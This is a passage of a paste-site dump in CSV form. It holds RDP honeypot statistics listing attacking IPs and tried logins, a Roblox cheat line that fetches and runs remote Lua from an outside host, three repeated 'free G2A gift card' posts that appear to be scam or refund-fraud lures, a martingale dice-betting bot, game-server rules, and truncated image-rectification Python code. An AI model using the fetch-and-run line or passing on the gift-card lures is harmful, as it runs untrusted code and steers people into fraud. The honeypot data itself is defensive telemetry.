    ""AS37963"": 12,
    ""AS142032"": 6,
    ""AS396982"": 26,
    ""AS5432"": 4,
    ""AS8151"": 2,
    ""AS45090"": 6,
    ""AS8075"": 4,
    ""AS19437"": 140,
    ""AS48721"": 12,
    ""AS208046"": 6,
    ""AS197414"": 4,
    ""AS3462"": 4,
    ""AS398722"": 2,
    ""AS134700"": 8,
    ""AS208312"": 12,
    ""AS151858"": 2,
    ""AS135377"": 4,
    ""AS134768"": 2,
    ""AS208091"": 2,
    ""AS58466"": 4,
    ""AS16276"": 2,
    ""AS133775"": 4,
    ""AS398324"": 4,
    ""AS20115"": 4
  },
  ""isp"": {
    ""Chinanet"": 108,
    ""Chang Way Technologies Co. Limited"": 32,
    ""Sangmyung University"": 4,
    ""velia.net Internetdienste GmbH"": 18,
    ""CNC Group CHINA169 Shandong Province Network"": 8,
    ""DigitalOcean, LLC"": 12,
    ""UCLOUD"": 6,
    ""INTERNET-RESEARCH"": 2,
    ""Cloud Computing Corporation"": 50,
    ""NEXLINX"": 2,
    ""CNC Group CHINA169 Neimeng Province Network"": 14,
    ""CHINANET Hubei province network"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 12,
    ""CHINANET Jiangx province IDC network"": 14,
    ""CHINANET Liaoning province Dalian MAN network"": 12,
    ""Frontier Communications Solutions"": 8,
    ""China Telecom (Group)"": 4,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 2,
    ""High Family Technology Co., Limited"": 6,
    ""Google LLC"": 26,
    ""Proximus"": 4,
    ""Uninet S.A. de C.V."": 2,
    ""Aceville Pte.ltd"": 4,
    ""China Unicom Tianjin Province Network"": 2,
    ""Addresses CNNIC"": 6,
    ""CHINA UNICOM China169 Backbone"": 4,
    ""Microsoft Corporation"": 4,
    ""Hainan Network of ChinaTelecom"": 2,
    ""Secured Servers LLC"": 140,
    ""Flyservers S.A."": 12,
    ""ColocationX Ltd."": 6,
    ""Xhost Internet Solutions LP"": 6,
    ""Chunghwa Telecom Co., Ltd."": 4,
    ""Censys, Inc."": 6,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""Sinoycloud Limited"": 8,
    ""Red Byte LLC"": 12,
    ""BQT"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""CHINANET SHAANXI province Cloud Base network"": 2,
    ""China Telecom"": 8,
    ""OVH SAS"": 2,
    ""Charter Communications"": 4
  },
  ""org"": {
    ""Chinanet JS"": 24,
    ""Chinanet SC"": 8,
    ""Chang Way Technologies Co. Limited"": 44,
    ""Chinanet YN"": 32,
    ""Chinanet GX"": 10,
    ""Korean Education Network"": 4,
    ""Eijaj Hussain Shaikhnag"": 18,
    ""Unknown"": 38,
    ""DigitalOcean, LLC"": 12,
    ""Shanghai UCloud Information Technology Company Limited"": 6,
    ""Chinanet SD"": 26,
    ""NEXLINX"": 2,
    ""Chinanet HB"": 2,
    ""Tencent Cloud Computing"": 6,
    ""Chinanet FJ"": 18,
    ""Chinanet JX"": 24,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 12,
    ""FTR3 FiberOptic-S Westminster CA"": 8,
    ""Chinanet SH"": 4,
    ""Alibaba.com LLC"": 2,
    ""VpsQuan L.L.C"": 6,
    ""Chinanet GD"": 22,
    ""Palo Alto Networks, Inc"": 24,
    ""Quantum ICT"": 4,
    ""Uninet S.A. de C.V."": 2,
    ""Ningbo chaoji mamawangluojishu ltd"": 6,
    ""Chinanet ZJ"": 6,
    ""Aliyun Computing Co., LTD"": 10,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 4,
    ""Unicom"": 4,
    ""Microsoft Azure Cloud (australiasoutheast)"": 2,
    ""Net"": 140,
    ""Flyservers S.A"": 12,
    ""Tencent cloud computing (Beijing) Co., Ltd."": 2,
    ""Makut Investments"": 6,
    ""Xhostis"": 4,
    ""Chunghwa Telecom Co. Ltd."": 4,
    ""Censys, Inc."": 2,
    ""CNISP-Union Technology (Beijing) Co., Ltd"": 8,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Chinanet SN"": 2,
    ""Xhost Internet Solutions"": 2,
    ""Ucloud Information Technology"": 2,
    ""OVH GmbH"": 2,
    ""Google Cloud (us-central1)"": 2,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Censys, Inc"": 4,
    ""Spectrum"": 4
  },
  ""regionName"": {
    ""Guangdong"": 46,
    ""Sichuan"": 8,
    ""Moscow"": 40,
    ""Yunnan"": 32,
    ""Guangxi"": 10,
    ""Seoul"": 4,
    ""Grand Est"": 18,
    ""Shandong"": 34,
    ""South West"": 10,
    ""Beijing"": 24,
    ""Land Berlin"": 2,
    ""Punjab"": 2,
    ""Inner Mongolia"": 14,
    ""Shanghai"": 18,
    ""Jiangsu"": 12,
    ""Tokyo"": 6,
    ""Fujian"": 22,
    ""Jiangxi"": 24,
    ""California"": 34,
    ""Kowloon"": 6,
    ""Brussels Capital"": 4,
    ""Mexico City"": 2,
    ""Zhejiang"": 12,
    ""North West"": 4,
    ""Tianjin"": 2,
    ""Victoria"": 2,
    ""Hainan"": 2,
    ""Virginia"": 150,
    ""Kaunas"": 12,
    ""North Holland"": 6,
    ""Taichung City"": 4,
    ""New York"": 2,
    ""Ho Chi Minh"": 2,
    ""Hesse"": 2,
    ""Shanxi"": 2,
    ""Lesser Poland"": 4,
    ""England"": 2,
    ""Iowa"": 2,
    ""Michigan"": 8
  },
  ""country"": {
    ""China"": 262,
    ""Russia"": 40,
    ""South Korea"": 4,
    ""France"": 18,
    ""Singapore"": 14,
    ""Germany"": 4,
    ""Pakistan"": 2,
    ""Japan"": 6,
    ""United States"": 196,
    ""Hong Kong"": 6,
    ""Belgium"": 4,
    ""Mexico"": 2,
    ""Australia"": 2,
    ""Lithuania"": 12,
    ""The Netherlands"": 6,
    ""Taiwan"": 4,
    ""Vietnam"": 2,
    ""Poland"": 4,
    ""United Kingdom"": 2
  },
  ""account"": {
    ""142.93.8.59"": 318,
    ""Administr"": 42,
    ""Test"": 16,
    ""hello"": 162,
    ""user"": 2,
    ""AFsBLIgTy"": 2,
    ""qOMEYh"": 2,
    ""MIfSfm"": 2,
    ""(empty)"": 8,
    ""Domain"": 14,
    ""EJeYyvoSb"": 2,
    ""HHbdgF"": 2,
    ""MHWUpl"": 2,
    ""Administrator"": 4,
    ""HLLgNcQAE"": 2,
    ""hIMfDh"": 2,
    ""vzRpYu"": 2,
    ""NyCLdmPcd"": 2,
    ""AsQQwH"": 2,
    ""jvTeKS"": 2
  },
  ""keyboard"": {
    ""Unknown"": 590
  },
  ""client_build"": {
    ""Unknown"": 590
  },
  ""client_name"": {
    ""Unknown"": 590
  },
  ""ip_type"": {
    ""Unknown"": 264,
    ""proxy"": 46,
    ""hosting"": 136,
    ""hosting & proxy"": 142,
    ""mobile"": 2
  }
}"
gwaMCyNY,2024-05-29_stats.json,rdp_snitch,JSON,Wednesday 29th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""114.217.18.245"": 5,
    ""118.122.196.39"": 4,
    ""185.198.69.5"": 5,
    ""106.58.219.212"": 1,
    ""185.198.69.16"": 1,
    ""180.136.3.186"": 5,
    ""185.198.69.7"": 1,
    ""117.16.46.253"": 2,
    ""134.119.207.154"": 9,
    ""185.198.69.15"": 2,
    ""119.167.77.62"": 4,
    ""206.189.32.215"": 1,
    ""113.31.112.144"": 2,
    ""45.83.64.195"": 1,
    ""140.246.215.173"": 2,
    ""116.58.51.242"": 1,
    ""124.67.254.109"": 7,
    ""119.96.234.88"": 1,
    ""106.58.212.195"": 2,
    ""150.223.76.57"": 3,
    ""185.198.69.13"": 1,
    ""185.198.69.3"": 1,
    ""221.229.220.51"": 1,
    ""112.116.111.230"": 7,
    ""43.133.3.182"": 3,
    ""203.56.4.242"": 2,
    ""106.225.199.92"": 2,
    ""185.198.69.11"": 2,
    ""43.226.53.56"": 6,
    ""150.223.46.21"": 3,
    ""47.180.107.12"": 4,
    ""106.58.215.193"": 2,
    ""58.218.204.183"": 3,
    ""218.78.58.53"": 1,
    ""47.116.4.18"": 1,
    ""198.44.167.61"": 3,
    ""117.41.184.60"": 3,
    ""106.58.164.84"": 2,
    ""14.29.228.234"": 1,
    ""185.198.69.4"": 1,
    ""203.57.39.224"": 4,
    ""185.198.69.9"": 2,
    ""182.42.62.22"": 1,
    ""205.210.31.40"": 3,
    ""81.246.124.198"": 2,
    ""64.23.218.92"": 1,
    ""187.157.89.218"": 1,
    ""14.29.142.134"": 5,
    ""122.227.146.74"": 3,
    ""43.133.56.30"": 2,
    ""36.111.146.78"": 3,
    ""111.161.41.132"": 1,
    ""222.93.104.67"": 1,
    ""47.100.38.137"": 3,
    ""150.223.32.106"": 4,
    ""101.34.80.30"": 1,
    ""128.199.141.142"": 2,
    ""152.42.249.196"": 2,
    ""43.136.43.178"": 1,
    ""211.91.60.69"": 2,
    ""183.6.165.166"": 3,
    ""13.70.153.24"": 1,
    ""113.31.124.58"": 1,
    ""124.225.69.183"": 1,
    ""45.153.166.4"": 70,
    ""194.165.16.78"": 2,
    ""106.55.54.44"": 1,
    ""185.196.220.41"": 3,
    ""185.170.144.3"": 2,
    ""203.33.207.66"": 3,
    ""194.165.16.37"": 2,
    ""1.168.148.191"": 2,
    ""199.45.154.54"": 1,
    ""106.58.211.156"": 1,
    ""123.56.20.194"": 2,
    ""49.84.226.2"": 2,
    ""198.235.24.239"": 3,
    ""114.112.14.39"": 4,
    ""218.65.17.106"": 5,
    ""194.165.16.76"": 2,
    ""213.109.202.237"": 4,
    ""103.75.182.179"": 1,
    ""165.154.138.85"": 1,
    ""117.23.59.141"": 1,
    ""205.210.31.178"": 3,
    ""2.57.149.186"": 2,
    ""87.251.75.64"": 1,
    ""14.18.41.26"": 2,
    ""106.58.166.180"": 1,
    ""152.32.183.22"": 1,
    ""51.89.9.215"": 1,
    ""34.72.251.13"": 1,
    ""61.171.106.140"": 1,
    ""137.117.58.16"": 1,
    ""106.225.199.24"": 2,
    ""125.77.197.43"": 2,
    ""198.235.24.87"": 3,
    ""167.94.138.121"": 1,
    ""97.91.36.242"": 2,
    ""167.94.138.126"": 1
  },
  ""asn"": {
    ""AS4134"": 55,
    ""AS57523"": 16,
    ""AS18031"": 2,
    ""AS29066"": 9,
    ""AS4837"": 14,
    ""AS14061"": 6,
    ""AS17621"": 3,
    ""AS208843"": 1,
    ""AS58519"": 25,
    ""AS17563"": 1,
    ""AS58563"": 1,
    ""AS132203"": 5,
    ""AS134238"": 7,
    ""AS134762"": 6,
    ""AS5650"": 4,
    ""AS4812"": 2,
    ""AS37963"": 6,
    ""AS142032"": 3,
    ""AS396982"": 13,
    ""AS5432"": 2,
    ""AS8151"": 1,
    ""AS45090"": 3,
    ""AS8075"": 2,
    ""AS19437"": 70,
    ""AS48721"": 6,
    ""AS208046"": 3,
    ""AS197414"": 2,
    ""AS3462"": 2,
    ""AS398722"": 1,
    ""AS134700"": 4,
    ""AS208312"": 6,
    ""AS151858"": 1,
    ""AS135377"": 2,
    ""AS134768"": 1,
    ""AS208091"": 1,
    ""AS58466"": 2,
    ""AS16276"": 1,
    ""AS133775"": 2,
    ""AS398324"": 2,
    ""AS20115"": 2
  },
  ""isp"": {
    ""Chinanet"": 54,
    ""Chang Way Technologies Co. Limited"": 16,
    ""Sangmyung University"": 2,
    ""velia.net Internetdienste GmbH"": 9,
    ""CNC Group CHINA169 Shandong Province Network"": 4,
    ""DigitalOcean, LLC"": 6,
    ""UCLOUD"": 3,
    ""INTERNET-RESEARCH"": 1,
    ""Cloud Computing Corporation"": 25,
    ""NEXLINX"": 1,
    ""CNC Group CHINA169 Neimeng Province Network"": 7,
    ""CHINANET Hubei province network"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 6,
    ""CHINANET Jiangx province IDC network"": 7,
    ""CHINANET Liaoning province Dalian MAN network"": 6,
    ""Frontier Communications Solutions"": 4,
    ""China Telecom (Group)"": 2,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 1,
    ""High Family Technology Co., Limited"": 3,
    ""Google LLC"": 13,
    ""Proximus"": 2,
    ""Uninet S.A. de C.V."": 1,
    ""Aceville Pte.ltd"": 2,
    ""China Unicom Tianjin Province Network"": 1,
    ""Addresses CNNIC"": 3,
    ""CHINA UNICOM China169 Backbone"": 2,
    ""Microsoft Corporation"": 2,
    ""Hainan Network of ChinaTelecom"": 1,
    ""Secured Servers LLC"": 70,
    ""Flyservers S.A."": 6,
    ""ColocationX Ltd."": 3,
    ""Xhost Internet Solutions LP"": 3,
    ""Chunghwa Telecom Co., Ltd."": 2,
    ""Censys, Inc."": 3,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Sinoycloud Limited"": 4,
    ""Red Byte LLC"": 6,
    ""BQT"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""CHINANET SHAANXI province Cloud Base network"": 1,
    ""China Telecom"": 4,
    ""OVH SAS"": 1,
    ""Charter Communications"": 2
  },
  ""org"": {
    ""Chinanet JS"": 12,
    ""Chinanet SC"": 4,
    ""Chang Way Technologies Co. Limited"": 22,
    ""Chinanet YN"": 16,
    ""Chinanet GX"": 5,
    ""Korean Education Network"": 2,
    ""Eijaj Hussain Shaikhnag"": 9,
    ""Unknown"": 19,
    ""DigitalOcean, LLC"": 6,
    ""Shanghai UCloud Information Technology Company Limited"": 3,
    ""Chinanet SD"": 13,
    ""NEXLINX"": 1,
    ""Chinanet HB"": 1,
    ""Tencent Cloud Computing"": 3,
    ""Chinanet FJ"": 9,
    ""Chinanet JX"": 12,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 6,
    ""FTR3 FiberOptic-S Westminster CA"": 4,
    ""Chinanet SH"": 2,
    ""Alibaba.com LLC"": 1,
    ""VpsQuan L.L.C"": 3,
    ""Chinanet GD"": 11,
    ""Palo Alto Networks, Inc"": 12,
    ""Quantum ICT"": 2,
    ""Uninet S.A. de C.V."": 1,
    ""Ningbo chaoji mamawangluojishu ltd"": 3,
    ""Chinanet ZJ"": 3,
    ""Aliyun Computing Co., LTD"": 5,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 2,
    ""Unicom"": 2,
    ""Microsoft Azure Cloud (australiasoutheast)"": 1,
    ""Net"": 70,
    ""Flyservers S.A"": 6,
    ""Tencent cloud computing (Beijing) Co., Ltd."": 1,
    ""Makut Investments"": 3,
    ""Xhostis"": 2,
    ""Chunghwa Telecom Co. Ltd."": 2,
    ""Censys, Inc."": 1,
    ""CNISP-Union Technology (Beijing) Co., Ltd"": 4,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Chinanet SN"": 1,
    ""Xhost Internet Solutions"": 1,
    ""Ucloud Information Technology"": 1,
    ""OVH GmbH"": 1,
    ""Google Cloud (us-central1)"": 1,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Censys, Inc"": 2,
    ""Spectrum"": 2
  },
  ""regionName"": {
    ""Guangdong"": 23,
    ""Sichuan"": 4,
    ""Moscow"": 20,
    ""Yunnan"": 16,
    ""Guangxi"": 5,
    ""Seoul"": 2,
    ""Grand Est"": 9,
    ""Shandong"": 17,
    ""South West"": 5,
    ""Beijing"": 12,
    ""Land Berlin"": 1,
    ""Punjab"": 1,
    ""Inner Mongolia"": 7,
    ""Shanghai"": 9,
    ""Jiangsu"": 6,
    ""Tokyo"": 3,
    ""Fujian"": 11,
    ""Jiangxi"": 12,
    ""California"": 17,
    ""Kowloon"": 3,
    ""Brussels Capital"": 2,
    ""Mexico City"": 1,
    ""Zhejiang"": 6,
    ""North West"": 2,
    ""Tianjin"": 1,
    ""Victoria"": 1,
    ""Hainan"": 1,
    ""Virginia"": 75,
    ""Kaunas"": 6,
    ""North Holland"": 3,
    ""Taichung City"": 2,
    ""New York"": 1,
    ""Ho Chi Minh"": 1,
    ""Hesse"": 1,
    ""Shanxi"": 1,
    ""Lesser Poland"": 2,
    ""England"": 1,
    ""Iowa"": 1,
    ""Michigan"": 4
  },
  ""country"": {
    ""China"": 131,
    ""Russia"": 20,
    ""South Korea"": 2,
    ""France"": 9,
    ""Singapore"": 7,
    ""Germany"": 2,
    ""Pakistan"": 1,
    ""Japan"": 3,
    ""United States"": 98,
    ""Hong Kong"": 3,
    ""Belgium"": 2,
    ""Mexico"": 1,
    ""Australia"": 1,
    ""Lithuania"": 6,
    ""The Netherlands"": 3,
    ""Taiwan"": 2,
    ""Vietnam"": 1,
    ""Poland"": 2,
    ""United Kingdom"": 1
  },
  ""account"": {
    ""142.93.8.59"": 159,
    ""Administr"": 21,
    ""Test"": 8,
    ""hello"": 81,
    ""user"": 1,
    ""AFsBLIgTy"": 1,
    ""qOMEYh"": 1,
    ""MIfSfm"": 1,
    ""(empty)"": 4,
    ""Domain"": 7,
    ""EJeYyvoSb"": 1,
    ""HHbdgF"": 1,
    ""MHWUpl"": 1,
    ""Administrator"": 2,
    ""HLLgNcQAE"": 1,
    ""hIMfDh"": 1,
    ""vzRpYu"": 1,
    ""NyCLdmPcd"": 1,
    ""AsQQwH"": 1,
    ""jvTeKS"": 1
  },
  ""keyboard"": {
    ""Unknown"": 295
  },
  ""client_build"": {
    ""Unknown"": 295
  },
  ""client_name"": {
    ""Unknown"": 295
  },
  ""ip_type"": {
    ""Unknown"": 132,
    ""proxy"": 23,
    ""hosting"": 68,
    ""hosting & proxy"": 71,
    ""mobile"": 1
  }
}"
aBzT4kE8,Pet 99 script spawn pet,sussybakasimualtor,Bash,Wednesday 29th of May 2024 07:04:59 PM CDT,loadstring(game:HttpGet('https://egorikusa.space/702fd8376adcff825325437a.lua'))()
8nD18L84,Nut Inc Test,NukeSCPSL,HTML,Wednesday 29th of May 2024 06:48:13 PM CDT,"<link=https://www.nutinc.net/><line-height=-50%><align=center><size=535%><color=#9B836910>N</color><color=#917A6210>u</color><color=#87715A10>t</color> <color=#9B696910>I</color><color=#8E606010>n</color><color=#81575710>c</color><color=#744E4E10>.</color></size>
</line-height><line-height=87%><size=530%><color=#FB8508>N</color><color=#ED7C04>u</color><color=#DE7200>t</color> <color=#FB0808>I</color><color=#E70606>n</color><color=#D20505>c</color><color=#BE0303>.</color></size></line-height></link>

<mark=#5662f6> 🌐 </mark><mark=#0d0d0d><b> ᴅɪꜱᴄᴏʀᴅㅤ</b></mark> <mark=#0d0d0d><b> ᴜᴘᴛɪᴍᴇ </b></mark><mark=#339933> ✅ㅤ </mark> 

<align=left><size=25><u><color=#A0A0A0>Server rules</color></u></size>
<line-height=70%><size=15>[<color=red>1</color>] Soundboards are allowed following these rules</size>
<size=11>│<color=orange>1a</color> - No mic spam. Soundboard is okay, but avoid playing loud or annoying sounds.
│<color=orange>1b</color> - Use soundboards in proximity chat only. Do not use them in SCP voice chat, spectator chat, or on the radios.
│<color=orange>1c</color> - Soundboards are permitted on the intercom if they adhere to rule 1a and are not repetitive and annoying.</size>

<size=15>[<color=red>2</color>] Respect and Language.</size>
<size=11>│<color=orange>2a</color> - No racist, sexist, or homophobic remarks will be tolerated. (This includes all slurs, such as the r-slur)
│<color=orange>2b</color> - Always respect the staff members. They have the final say in disputes.</size>

<size=15>[<color=red>3</color>] Class Interaction</size>
<size=11>│<color=orange>3a</color> - Guards are not allowed to harm Class-D in Light Containment unless in self-defense or if they are uncooperative. However, guards can harm Class-D after a spawn wave.
│<color=orange>3b</color> - Scientists are allowed to harm Class-D in Light Containment.
│<color=orange>3c</color> - Class-D can be harmed in Heavy Containment and Entrance Zone at any time.
│<color=orange>3d</color> - Do not harm detained Class-D or Scientists. (This includes those who are surrendering)</size>

<size=15>[<color=red>4</color>] Teamwork</size>
<size=11>│<color=orange>4a</color> - NEVER CLOSE DOORS ON TEAMMATES. NO EXCEPTIONS!</size>

<size=15>[<color=red>5</color>] Teaming and Mercy</size>
<size=11>│<color=orange>5a</color> - Chaos/Class-D can ally with SCPs, but it's optional.
│<color=orange>5b</color> - Some teams shouldn't ally. (Press F1 in-game for details)
│<color=orange>5c</color> - SCPs can spare and show mercy to unarmed personnel like D-Class or Scientists, but it's their choice.

<size=15>[<color=red>6</color>] Fairplay
<size=11>│<color=orange>6a</color> - Play fairly. Avoid ghosting, cheating, exploiting, or delaying rounds. (Ensure everyone enjoys the game)
<size=11>│<color=orange>6b</color> - If you dislike your class, don't kill yourself or rejoin to change it. This is a rule for all classes.</size>

<size=15>[<color=red>7</color>] Common sense
<size=11>│<color=orange>7a</color> - Use your common sense.</size></align></line-height>"
JSXMb8vV,💰G2A.com Free Gift Card Guide 2024 May🔥,kjihu25,Python,Wednesday 29th of May 2024 05:55:24 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7826881.pdf

Working as of:

29 May 2024"
wYejT0Zb,💰G2A.com Free Gift Card Guide 2024 May🚀,buch,Python,Wednesday 29th of May 2024 05:42:42 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7826881.pdf

Working as of:

29 May 2024"
yQiu0PY3,best bot ever by snowy,coinwalk,JavaScript,Wednesday 29th of May 2024 05:32:36 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/1000).toFixed(8));
var beast = prefit;
var crust = (prefit/2);
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var throttle = (prefit*24);
var winnerdinner = 144000;
var snow = elderly;
var james = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = 0;
var downer = 2.9;
var upper = 6.9;
var greatie = document.getElementById('pct_balance').value;
var neon = 0;
 
 function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
async function go(){
if (greatie!=great){
great = document.getElementById('pct_balance').value;
if (great>=snow){
neon = great-snow;
}
if (great<snow){
neon = snow-great; 
}
if ((neon<throttle)&&(great>snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = beast*2;
    throttle+beast;
    snowie = parseFloat(great);
}
if ((neon<throttle)&&(great<snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = beast*2;
    throttle-beast;
    snowie = parseFloat(great);
}
if ((neon>=throttle)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    neon = 0;
    throttle = (prefit*24);
    snow = parseFloat(great);
    snowie = 0;
}
if ((neon>=throttle)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    neon = 0;
    throttle = (prefit*24);
    snow = parseFloat(great);
    snowie = 0;
}
if ((neon>=throttle)&&(great>snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    neon = 0;
    throttle+beast;
    throttle = (prefit*24);
    snow = parseFloat(great);
    snowie = parseFloat(great);
}
if ((neon>=throttle)&&(great<snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    neon = 0;
    throttle-beast;
    throttle = (prefit*24);
    snow = parseFloat(great);
    snowie = parseFloat(great);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
await sleep(1);
greatie = document.getElementById('pct_balance').value;
go();
}
 
go();
"
L96bihKB,🤑G2A.com Free Gift Card Guide 2024 May💰,Garoam,Python,Wednesday 29th of May 2024 05:30:35 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7826881.pdf

Working as of:

29 May 2024"
uLrRNw6e,TILT,kub3,Python,Wednesday 29th of May 2024 05:25:07 PM CDT,"import os
import numpy as np
import cv2 as cv

ROOT = ""./""
TEST_IMGS_DIR = os.path.join(ROOT, ""test_images"")
RESULT_DIR = os.path.join(ROOT, ""runs"")

ORIG = ""Original image""
TILT = ""TILT""
NOISE = ""Noise""


def img_uint8_to_float(img: np.ndarray) -> np.ndarray:
    img = img.astype(np.float64)
    img /= 255
    return img


def img_float_to_uint8(img: np.ndarray) -> np.ndarray:
    img *= 255
    img = np.clip(img, 0, 255)
    img = img.astype(np.uint8)
    return img


def get_tau(theta, t) -> np.ndarray:
    """"""
    Parametrized transformation

    return array (3, 3)
    """"""
    cos_theta = np.cos(theta)
    sin_theta = np.sin(theta)
    tau = np.array(
        [
            [cos_theta, -sin_theta, 0],
            [sin_theta, cos_theta, 0],
            [0, 0, 1],
        ],
        dtype=np.float64,
    )  # (3, 3)
    b = np.array([[1, t], [0, 1]], dtype=np.float64)  # (2, 2)
    tau[:2, :2] @= b
    return tau


def transform_image(img: np.ndarray, src_pts: np.ndarray, tau: np.ndarray):
    """"""
    # Apply transformation Tau to the image
    # src_pts - points of the rectangle bounding the area of interest
    """"""
    assert src_pts.shape == (4, 2)
    pts = src_pts.copy()
    w, h = np.abs(pts[0] - pts[2])  # w, h: float
    center = (pts[0] + pts[2]) / 2  # array (2,)

    pts -= center
    pts = np.expand_dims(pts, 1)  # (4, 1, 2)
    pts = cv.perspectiveTransform(pts, tau)
    # (4, 1, 2)
    pts = pts.squeeze()
    pts += np.array([w, h]) / 2

    tfm = cv.getPerspectiveTransform(src_pts, pts)
    dst = cv.warpPerspective(
        img,
        tfm,
        (int(w), int(h)),
        flags=cv.INTER_LANCZOS4,
        borderMode=cv.BORDER_TRANSPARENT,
    )  # (h, w)
    return dst


def transform_points(src_pts: np.ndarray, tau: np.ndarray) -> np.ndarray:
    """"""
    Apply transformation to points of the bounding box
    """"""
    pts = src_pts.copy()
    center = (pts[0] + pts[2]) / 2

    pts -= center
    tau_inv = np.linalg.inv(tau)
    pts = np.expand_dims(pts, 1)
    pts = cv.perspectiveTransform(pts, tau_inv)
    pts = pts.squeeze()
    pts += center
    return pts


def get_cost_func(img: np.ndarray) -> float:
    """"""function which we minimize""""""
    norm_img = img / np.linalg.norm(img)
    w = cv.SVDecomp(norm_img, flags=cv.SVD_NO_UV)[0]
    # (array, None, None)
    # w.shape == img.shape[0], 1
    cost = np.sum(w)
    return cost


def get_jacobian(img: np.ndarray, src_pts: np.ndarray, tau: np.ndarray):
    """"""Jacobian of the image with respect to the transformation matrix""""""
    p = 8
    eps = 1e-3

    w, h = np.abs(src_pts[0] - src_pts[2]).astype(int)
    jac = np.zeros((w * h, p), dtype=np.float64)

    for i in range(p):
        tau_p = tau.copy()
        tau_m = tau.copy()
        tau_p.flat[i] += eps
        tau_m.flat[i] -= eps
        img_p = transform_image(img, src_pts, tau_p)  # (h, w)
        img_m = transform_image(img, src_pts, tau_m)  # (h, w)
        diff = img_p - img_m
        diff = cv.GaussianBlur(diff, (3, 3), 2)
        diff /= 2 * eps
        jac[:, i] = diff.flatten()  # (h * w,)
    return jac


def garrote_shrink(x: np.ndarray, t: float):
    mask = np.abs(x) > t
    x[mask] -= t**2 / x[mask]
    x[~mask] = 0
    return x


def tilt(
    src_img: np.ndarray, tau0: np.ndarray, src_pts: np.ndarray, lambd: float
):
    max_iters = 100
    p = 8
    rho = 1.25

    tau = tau0.copy()
    cost_prev = float(""inf"")

    for _ in range(max_iters):
        tau_img = transform_image(src_img, src_pts, tau)  # (h, w)
        jac = get_jacobian(src_img, src_pts, tau)  # (h * w, p)
        jac_inv = np.linalg.pinv(jac)  # (p, h * w)

        E = np.zeros_like(tau_img, dtype=np.float64)
        mu = rho / np.linalg.norm(tau_img)
        lagrange_mult = tau_img.copy()

        delta_tau = np.zeros(p, dtype=np.float64)
        delta_tau_prev = delta_tau.copy()
        img0 = np.zeros_like(tau_img)

        niters2 = 0
        while True:
            jac_mm_delta_tau = jac @ delta_tau  # (h * w,)
            jac_mm_delta_tau = jac_mm_delta_tau.reshape(tau_img.shape)

            tmp0 = tau_img + lagrange_mult / mu
            tmp1 = tmp0 + jac_mm_delta_tau
            sigma, u, vt = cv.SVDecomp(tmp1 - E)
            # (h,1), (h,h), (h,w)
            sigma = sigma.ravel()
            sigma = garrote_shrink(sigma, 1 / mu)
            img0 = u @ np.diag(sigma) @ vt  # (h,w)

            E = garrote_shrink(tmp1 - img0, lambd / mu)

            tmp2 = img0 + E
            tmp3 = tmp2 - tmp0
            tmp3 = tmp3.ravel()
            delta_tau = jac_inv @ tmp3  # (p,)

            jac_mm_delta_tau = jac @ delta_tau
            jac_mm_delta_tau = jac_mm_delta_tau.reshape(tau_img.shape)
            lagrange_mult += mu * (tau_img + jac_mm_delta_tau - tmp2)
            mu *= rho

            niters2 += 1
            if (
                niters2 > max_iters
                or niters2 > 1
                and cv.minMaxLoc(np.abs(delta_tau_prev - delta_tau))[1] < 1e-3
            ):
                break
            delta_tau_prev = delta_tau.copy()
        tau.flat[:p] += delta_tau

        A = transform_image(src_img, src_pts, tau)
        cost = get_cost_func(A)
        perf = cost_prev - cost
        cost_prev = cost

        A = img_float_to_uint8(A)
        E = img_float_to_uint8(E)

        cv.imshow(TILT, A)
        cv.imshow(NOISE, E)
        cv.waitKey(10)

        if perf <= 0:
            break
    return A, E, tau


def get_init_guess(img: np.ndarray, region: np.ndarray):
